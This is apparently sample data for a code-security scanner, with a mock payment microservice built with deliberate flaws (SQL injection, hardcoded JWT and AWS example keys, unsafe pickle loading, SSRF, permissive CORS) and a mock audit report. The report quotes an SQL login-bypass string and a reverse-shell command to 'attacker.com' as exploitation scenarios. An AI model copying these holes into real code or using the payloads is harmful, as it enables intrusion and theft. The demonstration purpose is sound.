import { Project, AnalysisResult } from '../types';

export const SAMPLE_PROJECT_PAYMENT_API: Project = {
  id: 'payment-api-prod',
  name: 'payment-api',
  description: 'Node.js & Python Microservice for Online Credit Card Processing & User Billing',
  uploadedAt: '2026-08-09T08:30:00Z',
  totalLines: 28431,
  languages: [
    { name: 'TypeScript', percentage: 68, color: '#3178c6' },
    { name: 'Python', percentage: 21, color: '#3572A5' },
    { name: 'SQL', percentage: 11, color: '#e38c00' },
  ],
  files: [
    {
      path: 'src/controllers/auth.ts',
      name: 'auth.ts',
      language: 'typescript',
      size: 2450,
      lines: 88,
      content: `import { Request, Response } from 'express';
import { db } from '../services/db';
import jwt from 'jsonwebtoken';

// HARDCODED SECRET - HIGH RISK
const JWT_SECRET = "super_secret_jwt_key_12345_do_not_share";

export const loginUser = async (req: Request, res: Response) => {
  const { username, password } = req.body;

  try {
    // VULNERABLE: Direct SQL string concatenation (SQL Injection)
    const query = "SELECT * FROM users WHERE username = '" + username + "' AND password_hash = '" + password + "'";
    console.log("Executing query:", query);
    
    const userResult = await db.query(query);

    if (userResult.rows.length === 0) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const user = userResult.rows[0];

    // Weak JWT signing algorithm and long expiration
    const token = jwt.sign(
      { userId: user.id, role: user.role, isSuperAdmin: user.is_admin },
      JWT_SECRET,
      { expiresIn: '365d' }
    );

    // Missing Secure and HttpOnly flags on cookie
    res.cookie('auth_token', token, { httpOnly: false, secure: false });

    return res.json({
      success: true,
      token,
      user: { id: user.id, username: user.username, role: user.role }
    });
  } catch (error: any) {
    // Leaking raw database exception details to client
    return res.status(500).json({ error: error.message, stack: error.stack });
  }
};

export const resetPassword = async (req: Request, res: Response) => {
  const { email, newPassword } = req.body;
  
  // MISSING RATE LIMITING AND OTP VERIFICATION
  const updateSql = "UPDATE users SET password_hash = '" + newPassword + "' WHERE email = '" + email + "'";
  await db.query(updateSql);

  return res.json({ message: "Password updated successfully" });
};
`
    },
    {
      path: 'src/controllers/payment.ts',
      name: 'payment.ts',
      language: 'typescript',
      size: 3120,
      lines: 104,
      content: `import { Request, Response } from 'express';
import { stripeService } from '../services/stripe';
import { db } from '../services/db';

export const processPayment = async (req: Request, res: Response) => {
  const { accountId, amount, currency, cardToken } = req.body;

  if (!amount || amount <= 0) {
    return res.status(400).json({ error: "Invalid payment amount" });
  }

  try {
    // N+1 Query Problem: Fetching user details in a loop for idempotency
    const userAccounts = await db.query("SELECT * FROM user_accounts WHERE account_id = $1", [accountId]);
    
    for (const acc of userAccounts.rows) {
      const auditLog = await db.query("SELECT * FROM audit_logs WHERE user_id = $1", [acc.user_id]);
      console.log("Found audit logs:", auditLog.rows.length);
    }

    // Processing charge without idempotency key validation
    const charge = await stripeService.createCharge({
      amount: amount * 100,
      currency,
      source: cardToken,
      description: \`Charge for account \${accountId}\`
    });

    // RACE CONDITION: Unhandled concurrent balance update
    await db.query("UPDATE user_accounts font SET balance = balance - $1 WHERE account_id = $2", [amount, accountId]);

    return res.json({ success: true, chargeId: charge.id });
  } catch (err) {
    console.error("Payment failure:", err);
    res.status(500).json({ error: "Payment processing failed" });
  }
};

export const refundPayment = async (req: Request, res: Response) => {
  const { chargeId } = req.params;
  
  // MISSING AUTHORIZATION CHECK: Any authenticated user can issue refunds for any chargeId
  const refund = await stripeService.refund(chargeId);
  return res.json({ status: "refunded", refundId: refund.id });
};
`
    },
    {
      path: 'src/middleware/cors.ts',
      name: 'cors.ts',
      language: 'typescript',
      size: 920,
      lines: 32,
      content: `import { Request, Response, NextFunction } from 'express';

export const allowAllCors = (req: Request, res: Response, next: NextFunction) => {
  // SECURITY RISK: Wildcard CORS origin with credentials enabled
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
};
`
    },
    {
      path: 'services/reconciliation.py',
      name: 'reconciliation.py',
      language: 'python',
      size: 1840,
      lines: 65,
      content: `import os
import requests
import pickle

# EXPOSED AWS CREDENTIALS IN SOURCE CODE
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

def reconcile_daily_transactions(file_path):
    """Reconciles internal DB ledger with Stripe export files."""
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File {file_path} not found")
        
    # VULNERABLE: Unsafe deserialization using pickle on untrusted user uploaded files
    with open(file_path, 'rb') as f:
        transaction_batch = pickle.load(f)
        
    print(f"Loaded {len(transaction_batch)} transactions for reconciliation")
    
    # SSRF Vulnerability: Making outbound HTTP request to user-supplied webhook endpoint without validation
    for tx in transaction_batch:
        if 'webhook_url' in tx:
            try:
                requests.post(tx['webhook_url'], json={"tx_id": tx.get('id'), "status": "reconciled"}, timeout=10)
            except Exception as e:
                print("Webhook dispatch error:", e)

    return True
`
    },
    {
      path: 'db/migrations/001_init.sql',
      name: '001_init.sql',
      language: 'sql',
      size: 1200,
      lines: 45,
      content: `-- Database Schema Initialization
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(255) NOT NULL UNIQUE,
  email VARCHAR(255) NOT NULL UNIQUE,
  password_hash TEXT NOT NULL,
  role VARCHAR(50) DEFAULT 'user',
  is_admin BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS user_accounts (
  account_id SERIAL PRIMARY KEY,
  user_id INT REFERENCES users(id),
  balance NUMERIC(12, 2) DEFAULT 0.00,
  currency VARCHAR(3) DEFAULT 'USD'
);

CREATE TABLE IF NOT EXISTS audit_logs (
  id SERIAL PRIMARY KEY,
  user_id INT,
  action TEXT,
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
`
    },
    {
      path: 'package.json',
      name: 'package.json',
      language: 'json',
      size: 650,
      lines: 28,
      content: `{
  "name": "payment-api",
  "version": "1.2.0",
  "description": "Core billing microservice",
  "main": "dist/index.js",
  "dependencies": {
    "express": "^4.16.1",
    "jsonwebtoken": "^8.3.0",
    "pg": "^7.12.0",
    "stripe": "^8.2.0",
    "axios": "^0.19.0"
  },
  "devDependencies": {
    "typescript": "^4.1.2",
    "@types/express": "^4.17.9"
  }
}`
    }
  ]
};

export const SAMPLE_ANALYSIS_RESULT: AnalysisResult = {
  projectId: 'payment-api-prod',
  projectName: 'payment-api',
  analyzedAt: new Date().toISOString(),
  totalFiles: 4,
  totalLines: 154,
  languagesBreakdown: [
    { name: 'TypeScript', percentage: 70, color: '#3178c6' },
    { name: 'Python', percentage: 20, color: '#3572A5' },
    { name: 'SQL', percentage: 10, color: '#e38c00' },
  ],
  scores: {
    overall: 82,
    security: 76,
    reliability: 89,
    performance: 81,
    maintainability: 84,
    architecture: 78
  },
  issueCounts: {
    critical: 2,
    high: 5,
    medium: 14,
    low: 23,
    info: 18
  },
  securitySummary: {
    sqlInjection: 2,
    hardcodedSecrets: 2,
    insecureAuth: 3,
    xss: 1,
    unsafeFileHandling: 1,
    ssrf: 1,
    pathTraversal: 1
  },
  qualitySummary: {
    cyclomaticComplexity: 'High',
    duplicationPercentage: 8.4,
    longFunctionsCount: 4,
    deadCodeLocations: 3,
    namingIssues: 7,
    errorHandlingGaps: 6
  },
  executiveSummary: {
    verdict: 'Critical Risk',
    headline: 'Critical vulnerabilities in Authentication and Data Access layers require immediate remediation.',
    summary: 'The security audit identified raw SQL string concatenations in login workflows, hardcoded cryptographic JWT and AWS keys, and unsafe Python pickle deserialization. Incoming API requests lack parameter schema enforcement, exposing payment processing endpoints to authorization bypass.',
    domainTopics: [
      {
        topic: 'Auth & Secrets Management',
        status: 'critical',
        details: 'Hardcoded JWT secret ("super_secret_jwt_key_12345") and plaintext AWS Access Keys discovered in source code.'
      },
      {
        topic: 'Data Access & Query Security',
        status: 'critical',
        details: 'Raw string concatenation in loginUser executes unsanitized user inputs into database queries (CWE-89).'
      },
      {
        topic: 'API Perimeter & Input Validation',
        status: 'warning',
        details: 'CORS configured with wildcard origin and credentials enabled; missing refund authorization checks.'
      },
      {
        topic: 'Error Boundaries & Async Resilience',
        status: 'warning',
        details: 'Raw database exception stack traces leaked directly to HTTP clients in 500 response bodies.'
      },
      {
        topic: 'Supply Chain & Dependency Audit',
        status: 'critical',
        details: 'Outdated Axios (CVE-2024-39338 SSRF) and jsonwebtoken (CVE-2022-23529 RCE) present in package manifest.'
      }
    ],
    keyStrengths: [
      'Layered microservice architecture separating web handlers from background reconciliation.',
      'Comprehensive TypeScript typing across request and response handlers.',
      'Integration with modern payment SDKs and relational database drivers.'
    ],
    keyRisks: [
      '3 Critical severity security vulnerabilities (SQL Injection, Secret Exposure, Pickle RCE).',
      'Outdated dependencies with known high-severity CVE advisories in OSV databases.',
      'N+1 query performance bottleneck in payment loop causing database connection exhaustion.'
    ],
    urgentActionItems: [
      'Refactor loginUser to use parameterized SQL queries ($1, $2).',
      'Rotate exposed AWS and JWT secrets to environment variables.',
      'Upgrade vulnerable axios and jsonwebtoken packages.'
    ],
    scanCoverage: {
      totalFilesScanned: 4,
      linesOfCode: 154,
      astNodesAnalyzed: 86,
      dependenciesAudited: 4,
      taintPathsChecked: 3
    }
  },
  issues: [
    {
      id: 'issue-101',
      severity: 'critical',
      category: 'security',
      title: 'SQL Injection via User Input Concatenation',
      file: 'src/controllers/auth.ts',
      line: 14,
      confidence: 0.98,
      analysisTier: 'tier2_ast_taint',
      taintFlow: {
        source: 'req.body.username',
        sink: 'db.query() at line 18',
        sinkType: 'sql',
        isSanitized: false,
        steps: [
          {
            type: 'source',
            label: 'User input source: req.body (username, password)',
            file: 'src/controllers/auth.ts',
            line: 10,
            snippet: 'const { username, password } = req.body;'
          },
          {
            type: 'step',
            label: 'Taint propagated into raw SQL query template buffer',
            file: 'src/controllers/auth.ts',
            line: 14,
            snippet: 'const query = "SELECT * FROM users WHERE username = \'" + username + "\' AND password_hash = \'" + password + "\'";'
          },
          {
            type: 'sink',
            label: 'SQL Database Sink: Raw execution without parameterized binding array',
            file: 'src/controllers/auth.ts',
            line: 18,
            snippet: 'const userResult = await db.query(query);'
          }
        ]
      },
      description: 'User-controlled query parameter `username` and `password` are concatenated directly into a raw SQL query string without parameterization or escaping.',
      whyItMatters: 'SQL Injection allows unauthorized attackers to bypass authentication entirely (e.g. entering `\' OR \'1\'=\'1`), read sensitive user data, modify database records, or drop entire tables.',
      potentialImpact: 'Total database breach, authentication bypass, data tampering, and potential remote command execution on database server.',
      exploitationScenario: "An attacker provides `admin' --` in the username field. The query becomes `SELECT * FROM users WHERE username = 'admin' -- ...` which logs in as admin without knowing the password.",
      recommendation: 'Use parameterized queries ($1, $2) or an ORM like Prisma or Drizzle to safely bind variables.',
      originalCode: `const query = "SELECT * FROM users WHERE username = '" + username + "' AND password_hash = '" + password + "'";`,
      suggestedFix: `const query = "SELECT * FROM users WHERE username = $1 AND password_hash = $2";
const userResult = await db.query(query, [username, password]);`,
      status: 'open',
      references: [
        'https://owasp.org/www-community/attacks/SQL_Injection',
        'CWE-89: Improper Neutralization of Special Elements used in an SQL Command'
      ]
    },
    {
      id: 'issue-102',
      severity: 'critical',
      category: 'security',
      title: 'Hardcoded JWT Secret & Weak Expiration',
      file: 'src/controllers/auth.ts',
      line: 6,
      confidence: 0.99,
      analysisTier: 'tier1_rules',
      description: 'The secret key used to sign and verify JSON Web Tokens is hardcoded directly in the source code file with a 365-day expiration time.',
      whyItMatters: 'Hardcoded secrets committed to source repositories can easily be exposed through leaks, public commits, or build artifacts, allowing anyone to forge administrative user tokens.',
      potentialImpact: 'Attain valid token generation for any arbitrary user or role, leading to full authorization bypass.',
      exploitationScenario: 'An attacker views the code repository or extracts string tokens to sign their own custom JWT with `{ "isSuperAdmin": true }`.',
      recommendation: 'Load secret keys from environment variables (`process.env.JWT_SECRET`) and rotate keys regularly. Set shorter token expiration periods (e.g. 15 minutes) with refresh tokens.',
      originalCode: `const JWT_SECRET = "super_secret_jwt_key_12345_do_not_share";`,
      suggestedFix: `const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
  throw new Error("JWT_SECRET environment variable is missing!");
}`,
      status: 'open',
      references: [
        'CWE-798: Use of Hard-coded Credentials',
        'OWASP Top 10 - Identification and Authentication Failures'
      ]
    },
    {
      id: 'issue-103',
      severity: 'high',
      category: 'security',
      title: 'Missing Authorization Check on Refund Endpoint',
      file: 'src/controllers/payment.ts',
      line: 48,
      confidence: 0.95,
      analysisTier: 'tier3_ai_reasoning',
      description: 'The `refundPayment` endpoint accepts a `chargeId` parameter without checking if the requesting user owns the payment charge or possesses refund administrative privileges.',
      whyItMatters: 'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization allows users to act upon resources belonging to other accounts.',
      potentialImpact: 'Financial drain via unauthorized refunds triggered by malicious users.',
      exploitationScenario: 'A regular user submits `POST /payment/refund/ch_123456789` for another customer\'s charge ID and successfully triggers an unauthorized Stripe refund.',
      recommendation: 'Verify ownership of the charge or enforce RBAC middleware checking `req.user.role === "admin"` before calling the refund service.',
      originalCode: `export const refundPayment = async (req: Request, res: Response) => {
  const { chargeId } = req.params;
  const refund = await stripeService.refund(chargeId);
  return res.json({ status: "refunded", refundId: refund.id });
};`,
      suggestedFix: `export const refundPayment = async (req: Request, res: Response) => {
  const { chargeId } = req.params;
  const userId = req.user?.id;

  // Verify ownership or admin permission
  const charge = await db.query("SELECT * FROM charges WHERE id = $1 AND user_id = $2", [chargeId, userId]);
  if (charge.rows.length === 0 && req.user?.role !== 'admin') {
    return res.status(403).json({ error: "Unauthorized refund request" });
  }

  const refund = await stripeService.refund(chargeId);
  return res.json({ status: "refunded", refundId: refund.id });
};`,
      status: 'open',
      references: [
        'CWE-285: Improper Authorization',
        'OWASP API Security - API1:2023 Broken Object Level Authorization'
      ]
    },
    {
      id: 'issue-104',
      severity: 'high',
      category: 'security',
      title: 'Exposed AWS Access Key in Source Code',
      file: 'services/reconciliation.py',
      line: 7,
      confidence: 0.99,
      description: 'AWS Access Key ID and Secret Key were identified in plain text inside `reconciliation.py`.',
      whyItMatters: 'Exposing cloud provider credentials allows malicious actors to access cloud infrastructure, steal database backups, or spawn costly compute resources.',
      potentialImpact: 'Cloud account takeover, data exfiltration, ransomware, and massive billing charges.',
      exploitationScenario: 'Automated GitHub scanners detect the AWS key pattern and compromise the AWS account within minutes of code submission.',
      recommendation: 'Revoke the exposed key immediately in AWS IAM console. Use AWS IAM Roles, environment variables, or secret managers (AWS Secrets Manager).',
      originalCode: `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"`,
      suggestedFix: `import os

AWS_ACCESS_KEY_ID = os.getenv("AWS_ACCESS_KEY_ID")
AWS_SECRET_ACCESS_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")`,
      status: 'open',
      references: ['CWE-798: Use of Hard-coded Credentials']
    },
    {
      id: 'issue-105',
      severity: 'high',
      category: 'security',
      title: 'Unsafe Deserialization via Python `pickle`',
      file: 'services/reconciliation.py',
      line: 16,
      confidence: 0.96,
      description: 'The `pickle.load` function is called on file streams uploaded by external users without validation or sandboxing.',
      whyItMatters: 'Python\'s `pickle` module is inherently unsafe for untrusted input because malicious pickle payloads can execute arbitrary Python code during deserialization.',
      potentialImpact: 'Remote Code Execution (RCE) on the reconciliation application server.',
      exploitationScenario: 'An attacker crafts a custom pickle byte payload containing `os.system("nc -e /bin/sh attacker.com 4444")` and uploads it as a transaction export file.',
      recommendation: 'Replace `pickle` with safe data formats like `json` or `csv`.',
      originalCode: `with open(file_path, 'rb') as f:
    transaction_batch = pickle.load(f)`,
      suggestedFix: `import json

with open(file_path, 'r', encoding='utf-8') as f:
    transaction_batch = json.load(f)`,
      status: 'open',
      references: ['CWE-502: Deserialization of Untrusted Data']
    },
    {
      id: 'issue-106',
      severity: 'medium',
      category: 'performance',
      title: 'N+1 Database Query Loop in Payment Processing',
      file: 'src/controllers/payment.ts',
      line: 17,
      confidence: 0.92,
      description: 'Executing database query `SELECT * FROM audit_logs WHERE user_id = $1` inside a `for` loop iteration over `userAccounts.rows`.',
      whyItMatters: 'N+1 query patterns create huge network latency, exhaust connection pools, and severely degrade server throughput under moderate user load.',
      potentialImpact: 'Database lockup, high API latency, timeouts during peak traffic.',
      exploitationScenario: 'When processing accounts with 500 sub-accounts, the function issues 501 sequential database roundtrips instead of 1 batched query.',
      recommendation: 'Use SQL JOINs or a single `IN (...)` clause to fetch all audit logs in a single query execution.',
      originalCode: `for (const acc of userAccounts.rows) {
  const auditLog = await db.query("SELECT * FROM audit_logs WHERE user_id = $1", [acc.user_id]);
  console.log("Found audit logs:", auditLog.rows.length);
}`,
      suggestedFix: `const userIds = userAccounts.rows.map(acc => acc.user_id);
if (userIds.length > 0) {
  const auditLogs = await db.query("SELECT * FROM audit_logs WHERE user_id = ANY($1::int[])", [userIds]);
  console.log("Total audit logs retrieved in 1 query:", auditLogs.rows.length);
}`,
      status: 'open',
      references: ['Performance Best Practices - ORM N+1 Avoidance']
    },
    {
      id: 'issue-107',
      severity: 'medium',
      category: 'security',
      title: 'Wildcard CORS Origin with Credentials Enabled',
      file: 'src/middleware/cors.ts',
      line: 5,
      confidence: 0.97,
      description: 'Setting `Access-Control-Allow-Origin: *` while simultaneously setting `Access-Control-Allow-Credentials: true`.',
      whyItMatters: 'This combination allows any malicious website visited by a logged-in user to send cross-origin requests and read sensitive API response payloads.',
      potentialImpact: 'Cross-site data theft, credential leakage, CSRF token theft.',
      exploitationScenario: 'An attacker hosts `malicious-site.com` that sends fetch requests to `payment-api.com/user` and reads back personal financial records.',
      recommendation: 'Reflect the specific whitelisted origin from an allowed domain list instead of using `*`.',
      originalCode: `res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');`,
      suggestedFix: `const allowedOrigins = ['https://app.yourdomain.com', 'https://dashboard.yourdomain.com'];
const origin = req.headers.origin;
if (origin && allowedOrigins.includes(origin)) {
  res.setHeader('Access-Control-Allow-Origin', origin);
  res.setHeader('Access-Control-Allow-Credentials', 'true');
}`,
      status: 'open',
      references: ['OWASP CORS Misconfiguration']
    }
  ],
  architectureNodes: [
    {
      id: 'fe',
      label: 'Client / React SPA',
      type: 'frontend',
      layer: 0,
      connections: ['api_gateway'],
      inboundConnections: [],
      files: ['src/App.tsx', 'src/pages/DashboardView.tsx'],
      symbols: ['App', 'DashboardView', 'CheckoutModal'],
      issuesCount: 1,
      status: 'healthy',
      technologies: ['React 19', 'Tailwind CSS', 'Vite'],
      details: 'Interactive client frontend single-page web app'
    },
    {
      id: 'api_gateway',
      label: 'API Gateway & Routes',
      type: 'api',
      layer: 1,
      connections: ['auth_service', 'payment_service'],
      inboundConnections: ['fe'],
      files: ['src/middleware/cors.ts', 'server.ts'],
      symbols: ['allowAllCors', 'ExpressRouter', 'ErrorHandler'],
      issuesCount: 3,
      status: 'warning',
      technologies: ['Node.js', 'Express 4', 'REST API'],
      details: 'CORS wildcard configuration & unhandled stack trace leakage'
    },
    {
      id: 'auth_service',
      label: 'Auth & JWT Service',
      type: 'auth',
      layer: 2,
      connections: ['database'],
      inboundConnections: ['api_gateway'],
      files: ['src/controllers/auth.ts'],
      symbols: ['loginUser', 'resetPassword', 'verifyJWT'],
      issuesCount: 2,
      status: 'critical',
      technologies: ['jsonwebtoken', 'bcrypt', 'RBAC'],
      details: 'SQL Injection in loginUser and Hardcoded JWT Secret'
    },
    {
      id: 'payment_service',
      label: 'Payment & Billing Controller',
      type: 'services',
      layer: 2,
      connections: ['database', 'external_stripe', 'py_reconciliation'],
      inboundConnections: ['api_gateway'],
      files: ['src/controllers/payment.ts'],
      symbols: ['processPayment', 'refundPayment', 'createCharge'],
      issuesCount: 2,
      status: 'warning',
      technologies: ['Stripe SDK', 'Financial Ledger'],
      details: 'Missing refund authorization & N+1 queries'
    },
    {
      id: 'py_reconciliation',
      label: 'Python Reconciliation Worker',
      type: 'queue',
      layer: 3,
      connections: ['external_aws', 'database'],
      inboundConnections: ['payment_service'],
      files: ['services/reconciliation.py'],
      symbols: ['reconcile_daily_transactions', 'exportBatch'],
      issuesCount: 2,
      status: 'critical',
      technologies: ['Python 3', 'pickle', 'boto3'],
      details: 'Exposed AWS Key & Unsafe Pickle Deserialization'
    },
    {
      id: 'database',
      label: 'PostgreSQL Relational DB',
      type: 'database',
      layer: 3,
      connections: [],
      inboundConnections: ['auth_service', 'payment_service', 'py_reconciliation'],
      files: ['db/migrations/001_init.sql'],
      symbols: ['users_table', 'user_accounts_table', 'audit_logs_table'],
      issuesCount: 1,
      status: 'critical',
      technologies: ['PostgreSQL 16', 'pg driver'],
      details: 'Tables: users, user_accounts, audit_logs'
    },
    {
      id: 'external_stripe',
      label: 'Stripe API Gateway',
      type: 'external',
      layer: 4,
      connections: [],
      inboundConnections: ['payment_service'],
      files: ['External Cloud API'],
      symbols: ['charges.create', 'refunds.create'],
      issuesCount: 0,
      status: 'healthy',
      technologies: ['Stripe REST API'],
      details: 'External PCI-DSS Payment Processor Gateway'
    },
    {
      id: 'external_aws',
      label: 'AWS Cloud Services (S3/IAM)',
      type: 'external',
      layer: 4,
      connections: [],
      inboundConnections: ['py_reconciliation'],
      files: ['services/reconciliation.py'],
      symbols: ['s3:PutObject', 'IAM Credentials'],
      issuesCount: 1,
      status: 'critical',
      technologies: ['Amazon S3', 'boto3'],
      details: 'S3 cloud storage & IAM credentials'
    }
  ],
  architectureEdges: [
    {
      id: 'e1',
      source: 'fe',
      target: 'api_gateway',
      sourceLabel: 'Client / React SPA',
      targetLabel: 'API Gateway & Routes',
      type: 'http_rest',
      label: 'HTTP / REST API (JSON/CORS)',
      strength: 'high',
      risk: 'low',
      riskDetails: 'Standard decoupled HTTP transport'
    },
    {
      id: 'e2',
      source: 'api_gateway',
      target: 'auth_service',
      sourceLabel: 'API Gateway & Routes',
      targetLabel: 'Auth & JWT Service',
      type: 'http_rest',
      label: 'POST /auth/login, POST /auth/reset',
      strength: 'high',
      risk: 'medium',
      riskDetails: 'Direct route dispatch; lacks input validation schema'
    },
    {
      id: 'e3',
      source: 'api_gateway',
      target: 'payment_service',
      sourceLabel: 'API Gateway & Routes',
      targetLabel: 'Payment & Billing Controller',
      type: 'http_rest',
      label: 'POST /payment/charge, POST /payment/refund',
      strength: 'high',
      risk: 'high',
      riskDetails: 'Refund endpoint lacks RBAC role check before service execution'
    },
    {
      id: 'e4',
      source: 'auth_service',
      target: 'database',
      sourceLabel: 'Auth & JWT Service',
      targetLabel: 'PostgreSQL Relational DB',
      type: 'database_query',
      label: 'db.query("SELECT * FROM users...")',
      strength: 'high',
      risk: 'critical',
      riskDetails: 'Direct SQL string concatenation without parameterized placeholders ($1)'
    },
    {
      id: 'e5',
      source: 'payment_service',
      target: 'database',
      sourceLabel: 'Payment & Billing Controller',
      targetLabel: 'PostgreSQL Relational DB',
      type: 'database_query',
      label: 'db.query(SELECT/UPDATE balance)',
      strength: 'high',
      risk: 'high',
      riskDetails: 'N+1 query loop fetching audit logs sequentially inside payment loop'
    },
    {
      id: 'e6',
      source: 'payment_service',
      target: 'external_stripe',
      sourceLabel: 'Payment & Billing Controller',
      targetLabel: 'Stripe API Gateway',
      type: 'external_api',
      label: 'stripeService.createCharge()',
      strength: 'medium',
      risk: 'low',
      riskDetails: 'Third-party HTTPS API call with card tokens'
    },
    {
      id: 'e7',
      source: 'payment_service',
      target: 'py_reconciliation',
      sourceLabel: 'Payment & Billing Controller',
      targetLabel: 'Python Reconciliation Worker',
      type: 'queue_event',
      label: 'Async Batch Export & Queue Event',
      strength: 'medium',
      risk: 'medium',
      riskDetails: 'File-based batch handoff; missing event queue isolation'
    },
    {
      id: 'e8',
      source: 'py_reconciliation',
      target: 'database',
      sourceLabel: 'Python Reconciliation Worker',
      targetLabel: 'PostgreSQL Relational DB',
      type: 'database_query',
      label: 'SQL Audit Verification Pool',
      strength: 'medium',
      risk: 'low',
      riskDetails: 'Shared database connection pool between microservices'
    },
    {
      id: 'e9',
      source: 'py_reconciliation',
      target: 'external_aws',
      sourceLabel: 'Python Reconciliation Worker',
      targetLabel: 'AWS Cloud Services (S3/IAM)',
      type: 'external_api',
      label: 'boto3.client("s3") & IAM',
      strength: 'medium',
      risk: 'critical',
      riskDetails: 'Hardcoded AWS Access Keys embedded in worker source code'
    }
  ],
  architecturalSmells: [
    {
      id: 'smell-1',
      title: 'Layer Inversion: Direct DB Driver Invocations in Auth Controller',
      severity: 'high',
      category: 'layer_violation',
      description: 'Controllers (`src/controllers/auth.ts`) directly execute raw SQL queries via `db.query` instead of routing through an isolated Data Access Object (DAO) or repository interface.',
      affectedNodes: ['auth_service', 'database'],
      affectedFiles: ['src/controllers/auth.ts'],
      recommendation: 'Introduce an `UserRepository` interface with abstract methods (`findByUsername`, `updatePassword`) to encapsulate query logic and parameter binding.'
    },
    {
      id: 'smell-2',
      title: 'Insecure Microservice Coupling: Pickle Serializer & Unbounded Egress',
      severity: 'critical',
      category: 'insecure_egress',
      description: 'The background worker service (`services/reconciliation.py`) consumes raw serialized binary streams (`pickle.load`) and issues outbound HTTP webhooks to arbitrary URLs without domain whitelist validation.',
      affectedNodes: ['py_reconciliation', 'external_aws'],
      affectedFiles: ['services/reconciliation.py'],
      recommendation: 'Replace Python `pickle` with schema-enforced JSON / Protocol Buffers, and validate outbound webhook URLs against a private IP blacklist to prevent SSRF.'
    },
    {
      id: 'smell-3',
      title: 'Distributed Monolith: Shared Database Anti-Pattern',
      severity: 'medium',
      category: 'coupling',
      description: 'Both the Node.js Payment API and the Python Reconciliation Worker read and modify the same underlying tables without schema boundary protection.',
      affectedNodes: ['payment_service', 'py_reconciliation', 'database'],
      affectedFiles: ['src/controllers/payment.ts', 'services/reconciliation.py'],
      recommendation: 'Expose a dedicated internal gRPC or REST endpoint on the Payment Service for ledger verification instead of direct dual-language database access.'
    }
  ],
  dependencies: [
    {
      id: 'dep-express',
      name: 'express',
      version: '4.16.1',
      resolvedVersion: '4.16.1',
      latestVersion: '4.21.2',
      ecosystem: 'npm',
      isDirect: true,
      isTransitive: false,
      dependencyPath: ['payment-api', 'express'],
      riskLevel: 'medium',
      vulnerabilities: [
        {
          id: 'GHSA-qw6h-v559-w3pj',
          aliases: ['CVE-2024-29041', 'GHSA-qw6h-v559-w3pj'],
          summary: 'Open Redirect & Query Parameter Parsing Desync in Express router',
          details: 'In express versions prior to 4.21.0, redirect URL construction without validation can permit attacker-controlled open redirects.',
          fixedIn: '4.21.2',
          cvssScore: 6.5,
          severity: 'medium',
          exploitAvailable: false,
          published: '2024-03-20',
          references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-29041']
        }
      ],
      vulnerability: 'CVE-2024-29041: Open Redirect & Query Parameter Parsing Desync',
      cve: 'CVE-2024-29041',
      ghsa: 'GHSA-qw6h-v559-w3pj',
      fixedIn: '4.21.2',
      exploitAvailable: false,
      license: 'MIT',
      usageFile: 'package.json',
      description: 'Fast, unopinionated, minimalist web framework for Node.js'
    },
    {
      id: 'dep-jwt',
      name: 'jsonwebtoken',
      version: '8.3.0',
      resolvedVersion: '8.3.0',
      latestVersion: '9.0.2',
      ecosystem: 'npm',
      isDirect: true,
      isTransitive: false,
      dependencyPath: ['payment-api', 'jsonwebtoken'],
      riskLevel: 'high',
      vulnerabilities: [
        {
          id: 'GHSA-qwph-4952-7xr6',
          aliases: ['CVE-2022-23529', 'GHSA-qwph-4952-7xr6'],
          summary: 'Insecure Key Verification / Arbitrary Code Execution in jwt.verify',
          details: 'jsonwebtoken prior to 9.0.0 allows untrusted secretOrPublicKey parameters to invoke toString() properties in malicious objects, leading to arbitrary code execution in certain execution contexts.',
          fixedIn: '9.0.2',
          cvssScore: 8.1,
          severity: 'high',
          exploitAvailable: true,
          published: '2022-12-21',
          references: ['https://nvd.nist.gov/vuln/detail/CVE-2022-23529', 'https://github.com/advisories/GHSA-qwph-4952-7xr6']
        }
      ],
      vulnerability: 'CVE-2022-23529: Insecure Key Verification & Arbitrary Code Execution',
      cve: 'CVE-2022-23529',
      ghsa: 'GHSA-qwph-4952-7xr6',
      fixedIn: '9.0.2',
      exploitAvailable: true,
      license: 'MIT',
      usageFile: 'package.json',
      description: 'An implementation of JSON Web Tokens'
    },
    {
      id: 'dep-axios',
      name: 'axios',
      version: '0.19.0',
      resolvedVersion: '0.19.0',
      latestVersion: '1.7.9',
      ecosystem: 'npm',
      isDirect: true,
      isTransitive: false,
      dependencyPath: ['payment-api', 'axios'],
      riskLevel: 'high',
      vulnerabilities: [
        {
          id: 'GHSA-8hc4-vh64-cxmj',
          aliases: ['CVE-2024-39338', 'GHSA-8hc4-vh64-cxmj'],
          summary: 'Server-Side Request Forgery (SSRF) and Header Confidentiality Leakage',
          details: 'Axios allows absolute URL paths to bypass baseURL and proxy settings during HTTP redirect handling, resulting in SSRF and authorization header exposure.',
          fixedIn: '1.7.9',
          cvssScore: 7.5,
          severity: 'high',
          exploitAvailable: true,
          published: '2024-06-25',
          references: ['https://nvd.nist.gov/vuln/detail/CVE-2024-39338']
        }
      ],
      vulnerability: 'CVE-2024-39338: SSRF & Header Confidentiality Leakage',
      cve: 'CVE-2024-39338',
      ghsa: 'GHSA-8hc4-vh64-cxmj',
      fixedIn: '1.7.9',
